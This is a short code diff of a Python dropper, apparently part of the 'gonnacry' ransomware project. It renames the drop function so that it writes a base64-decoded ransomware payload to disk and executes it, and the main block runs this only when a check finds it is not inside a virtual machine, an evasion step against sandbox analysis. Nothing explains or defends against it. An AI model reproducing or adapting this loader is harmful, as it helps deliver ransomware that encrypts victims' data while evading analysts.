@@ -81,17 +81,17 @@ def inside_VM():
     return False
 
 
-def drop_gonnacry():
+def drop_n_run_gonnacry():
     with open(variables.gonnacry_path, 'wb') as f:
         f.write(base64.b64decode(variables.gonnacry))
         
-    command = './{}'.format(variables.gonnacry_path)
+    command = '.{}'.format(variables.gonnacry_path)
     utils.run_subprocess(command)
 
 
 if __name__ == "__main__":
     if(not inside_VM()):
-        drop_gonnacry()
+        drop_n_run_gonnacry()
     else:
         sys.exit(-1)
         
